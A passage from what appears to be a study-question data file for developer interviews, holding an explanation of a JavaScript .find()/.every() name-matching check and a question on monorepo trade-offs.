    answer: 'Code:\n  const match = findMatches(searchWords, name).find((indexes) =>\n    indexes.every((index) => !usedIndexes.has(index)),\n  );\n\nStep by step:\n\n1. findMatches returns all positions where the name appears:\n   e.g. [[3,4], [7,8]] (name found at two places in the search string)\n\n2. .find((indexes) => ...) — iterates through positions, returns first passing one:\n   checks [3,4] first. If that passes, stops and returns [3,4].\n   If [3,4] fails, tries [7,8]. If both fail, returns undefined.\n\n3. indexes.every((index) => !usedIndexes.has(index)) — ALL indices must be unclaimed:\n   For [3,4]: is 3 in usedIndexes? No. Is 4 in usedIndexes? No. → true\n   If even ONE index was claimed, .every() = false → this position is rejected\n\nWhy .every() and not .some():\n   .some() would allow a partial overlap — claiming a position where one word is already taken.\n   That would be wrong: if "amy" (index 3) was already claimed by another name, we cannot claim "Amy Smith" at positions [3,4]. Both words must be free.\n\n4. if (!match) return false — undefined means no valid position found.\n5. match.forEach(i => usedIndexes.add(i)) — mark the position as claimed.',
    tip: '.every() is the guard that prevents partial overlaps. .find() is what gives you the first valid position.',
  },

  {
    id: 63,
    category: 'cicd',
    difficulty: 'hard',
    question: 'What is a monorepo and what are the trade-offs compared to separate repositories?',
    answer: 'Monorepo: all packages/apps in one Git repository.\n  /packages/web    — React frontend\n  /packages/api    — Lambda handlers\n  /packages/shared — shared TypeScript types (Employee, SearchParams)\n  /infrastructure  — Terraform\n\nAdvantages:\n  ✓ Single PR for cross-cutting changes (e.g. rename Employee.firstName — update type, API, and UI in one commit)\n  ✓ Shared types eliminate frontend/backend drift\n  ✓ Unified tooling (one eslint config, one tsconfig base)\n  ✓ Turborepo caches build/test output — only rebuilds changed packages\n\nDisadvantages:\n  ✗ Repo grows large — git operations slower\n  ✗ CI must be smart about running only affected tests (Turborepo handles this)\n  ✗ Access control is coarser — can\'t give someone access to just the frontend\n  ✗ Noisy git history if many teams work in the same repo\n\nFor a full-stack TypeScript project: a monorepo is well-suited — the shared Employee type alone justifies it.',
    tip: 'The shared types argument is the strongest practical benefit — make that concrete with the Employee interface example.',
  },
];
